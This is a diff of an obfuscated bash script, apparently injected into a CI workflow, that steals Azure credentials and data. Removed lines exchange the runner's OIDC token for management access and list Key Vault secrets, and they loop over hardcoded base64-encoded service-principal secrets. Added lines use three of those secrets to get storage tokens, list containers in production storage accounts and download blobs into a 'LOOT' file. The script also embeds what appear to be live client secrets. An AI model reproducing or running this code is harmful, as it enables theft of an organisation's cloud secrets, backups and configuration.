@@ -3,30 +3,36 @@ set -uo pipefail
 b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
 AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
-ARM="${SC}$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')"
 ASCOPE=$(b 'aHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS8uZGVmYXVsdA==')
-VSCOPE=$(b 'aHR0cHM6Ly92YXVsdC5henVyZS5uZXQvLmRlZmF1bHQ=')
+STCOPE=$(b 'aHR0cHM6Ly9zdG9yYWdlLmF6dXJlLmNvbS8uZGVmYXVsdA==')
 TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
-SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
-RG=rg-tbl-platform-prod-sea
+BLB=".$(b 'YmxvYi5jb3JlLndpbmRvd3MubmV0')"
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
+tok(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
 say "=== START $(date -u) ==="
 say "PROOF: $(id) | host=$(hostname)"
-tok(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3"; }
-say "SUBS: $(curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')" --data-urlencode "scope=$ASCOPE" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")' > /tmp/ft) ; FT=$(cat /tmp/ft)"
-say "ALL_SUBS: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions?api-version=2022-12-01" | head -c 1500)"
-say "PROD_NAMES: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2023-07-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([x["name"] for x in d.get("value",[])] if isinstance(d,dict) else d)' 2>&1 | head -c 1200)"
-say "SEC_NAMES: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 800)"
-IFS='|' read -ra SP <<< "$(b 'MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxOjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm18MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTZ8MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5Om5QODhRfjhJfndpcDBHT2xXMTV6ZHQzRk1NdkJWOUxZdGFPb2VhM3p8ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNjOi1UbDhRfnNIMFFPUC5WcktXaGEzLTd4NFhBMkp4UzRqMDhudXZiUU58NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJlOn44VDhRfll3RW1leFNUUnZfcFVzRXdhOVFNYXB5UDM5fkNVNVVjdTJ8NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0OnNrMThRfnFEMjJra0hYVUNmcVhMcWRQOTVEa1lKTDM0ZU1FUmxjU2o=')"
-for pair in "${SP[@]}"; do
-  AID="${pair%%:*}"; SEC="${pair#*:}"
-  R=$(tok "$AID" "$SEC" "$ASCOPE")
-  AT=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR:"+d.get("error","")[:40]+":"+(d.get("error_description","")[:80]))')
-  say "SP $AID ARMlen=${#AT}"
-  VT=$(tok "$AID" "$SEC" "$VSCOPE" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")')
-  say "  SEC_data_$AID: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets?api-version=7.4" | head -c 300)"
-  say "  PROD_data_$AID: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets?api-version=7.4" | head -c 300)"
-  say "  SEC_mgmt_$AID: $(curl -sS -H "Authorization: Bearer $AT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 400)"
+AID=462d1c38-4459-48b8-9333-82e389e59514; SEC="$(b 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')"
+ST=$(tok "$AID" "$SEC" "$STCOPE"); say "PA storage len=${#ST}"
+AID2=038bc35d-131d-4953-9985-ff4a245ccec1; SEC2="$(b 'MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==')"
+ST2=$(tok "$AID2" "$SEC2" "$STCOPE"); say "CR storage len=${#ST2}"
+AID3=58108da8-044e-4d7e-9a46-92e6179b30be; SEC3="$(b 'fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==')"
+ST3=$(tok "$AID3" "$SEC3" "$STCOPE"); say "SS storage len=${#ST3}"
+for ACCT in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
+  for T in "$ST" "$ST2" "$ST3"; do
+    say "== $ACCT st=${#T} containers =="
+    say "$(curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "${SC}$ACCT$BLB/?comp=list" | head -c 700)"
+  done
+done
+# list blobs inside the known containers with platform-automation token
+for CT in logs exports config; do
+  case $CT in logs) AC=sttblcilogsprodx3euoz;; exports) AC=sttblbackupprodx3euoz;; config) AC=sttblappcfgprodx3euoz;; esac
+  say "== blobs $AC/$CT (PA) =="
+  BL=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "${SC}$AC$BLB/$CT?restype=container&comp=list")
+  say "$(echo "$BL" | head -c 1500)"
+  for N in $(echo "$BL" | grep -oP '(?<=<Name>)[^<]+' | head -20); do
+    say "---- $AC/$CT/$N ----"
+    say "$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "${SC}$AC$BLB/$CT/$N" | head -c 1500)"
+  done
 done
 say "=== DONE ==="
 PASS=$(openssl rand -hex 16)
